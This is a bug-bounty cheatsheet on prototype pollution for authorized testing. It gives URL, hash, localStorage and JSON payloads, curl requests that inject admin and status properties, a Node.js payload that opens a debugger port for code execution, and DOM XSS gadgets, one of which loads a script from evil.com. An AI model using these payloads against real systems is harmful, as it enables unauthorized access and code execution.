---
tags: [bugbounty, vuln/prototype-pollution, cheatsheet, p1, p2, p3]
aliases: [Prototype Pollution, PP, __proto__]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Prototype Pollution

> [!tldr] Hunter Summary
> **What:** Inject properties into JavaScript Object prototype — affects all objects in the runtime.
> **Impact:** Client-side: XSS via DOM sink. Server-side: RCE (Node.js), authentication bypass, property injection.
> **Best targets:** Query params with `__proto__`, `constructor.prototype`, JSON merge libs, `lodash.merge`, `jQuery.extend`.
> **Time to triage:** 10–15 min. Test `?__proto__[x]=1` then `?x=test` and see if it reflects.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Query params | Any params parsed into objects: `?a[b]=c` style |
| JSON body | Object merge, deep clone operations |
| URL hash | Single-page apps parsing hash params |
| Libraries | lodash.merge, jQuery.extend, Hoek.merge, defaults-deep |
| Node.js APIs | `qs` library (parses query strings) |

---

## Detection Payloads

### Client-side (browser)
```
# In URL params
?__proto__[testprop]=hacked
?constructor[prototype][testprop]=hacked
?__proto__.testprop=hacked

# Then verify in browser console:
{}. testprop  → "hacked" = confirmed
```

### Server-side (Node.js)
```http
POST /api/merge HTTP/1.1
Content-Type: application/json

{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

---

## Step-by-Step Hunt

### Step 1 — Find JSON merge / deep clone operations
Look for API endpoints that:
- Accept arbitrary JSON body
- Merge user input into existing objects
- Process query parameters into nested objects

### Step 2 — Test client-side PP
```
# Payload 1: URL params
https://target.com/page?__proto__[innerHTML]=<img/src/onerror=alert(1)>
https://target.com/page?constructor.prototype.innerHTML=<img src=x onerror=alert(1)>

# Payload 2: hash
https://target.com/page#__proto__[innerHTML]=<img/src/onerror=alert(1)>

# Payload 3: JSON in localStorage
# If app reads user data from localStorage and merges it:
localStorage.setItem('config', '{"__proto__":{"innerHTML":"<img/onerror=alert(1)>"}}')
```

### Step 3 — Test server-side PP (Node.js)
```bash
# Test for property injection
curl -X POST https://target.com/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

# Then check if you got admin access:
curl https://target.com/api/admin/dashboard \
  -H "Authorization: Bearer USER_TOKEN"

# Test status bypass
curl -X POST https://target.com/api/profile \
  -d '{"__proto__": {"status": "verified"}}'
```

### Step 4 — RCE via SSJI (Server-Side JS Injection)
In vulnerable Node.js apps (child_process usage after PP):
```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:1337"}}
```

### Step 5 — DOM XSS via PP gadgets
```javascript
// Common gadgets (client-side PP to XSS)
__proto__[innerHTML] = "<img src=x onerror=alert(1)>"
__proto__[template] = "<img src=x onerror=alert(1)>"
__proto__[src] = "//evil.com/script.js"
__proto__[href] = "javascript:alert(1)"

// Using DOM Invader (Burp) — automates client-side PP gadget finding
```

---

## Tools

| Tool | Use |
|------|-----|
| `ppfuzz` | Automated prototype pollution fuzzer |
| Burp DOM Invader | Client-side PP + gadget finding |
| `ppdoor` | Server-side PP scanner |

---

## 2025-2026 Updates

> [!info] Prototype pollution (2025-2026)
> - **React/Next.js gadgets:** New gadgets found in popular frameworks where PP leads to XSS in specific React internals
> - **JSON merge patch (RFC 7396):** Apps implementing PATCH with deep merge vulnerable
> - **Electron apps:** Desktop apps using Node.js — PP can lead to shell execution

---

## References

- PortSwigger Prototype Pollution — https://portswigger.net/web-security/prototype-pollution
- Snyk prototype pollution research
- PayloadsAllTheThings PP — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
